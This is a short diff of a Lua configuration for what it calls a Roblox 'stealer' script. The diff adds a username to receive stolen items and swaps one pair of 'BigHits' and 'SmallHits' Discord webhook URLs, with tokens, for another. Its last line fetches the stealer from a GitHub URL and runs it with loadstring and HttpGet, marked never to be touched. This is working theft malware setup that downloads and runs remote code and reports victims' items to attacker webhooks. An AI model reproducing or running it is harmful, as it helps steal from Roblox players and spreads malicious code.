@@ -2,9 +2,10 @@ STEALER_LINK = 'https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/Shu
 
 Usernames = {
     'JamesCounterXyb', -- PUT UR ROBLOX USERNAMES
+    'fatir_aja'
 }
 
-BigHitsWebhook = "https://discord.com/api/webhooks/1360900864574750750/2rK2arJ-db7gg2yK9KIDOFltalt98IgHuWfwzHNwr1yRTcRuERJn6us7PNgyttCOVXe7"
-SmallHitsWebhook = "https://discord.com/api/webhooks/1360900942400061623/TKC97QxKpdy4BX4p4nINcadsFCgjGut3o0tUayJFI1Jm_9TaWCmcmdrGgNrRiF9IPl3N"
+BigHitsWebhook = "https://discord.com/api/webhooks/1361339623258718228/8eMLiikY6VRUNgWQ__IZt6jx1iFltfpbOARM6Sb_L241p-EtIoLRCtnlwrMtrq-qe4na"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1361339543327871016/Iz2gOmvG1NP5kOIUMQuq5jknbxLPcGTfpIVqE2iceqyCm4kFNimda3uzaIVPTNapZ77I"
 
 loadstring(game:HttpGet(STEALER_LINK, true))() -- NEVER TOUCH THAT LINE OF CODE JUST DONT!!!
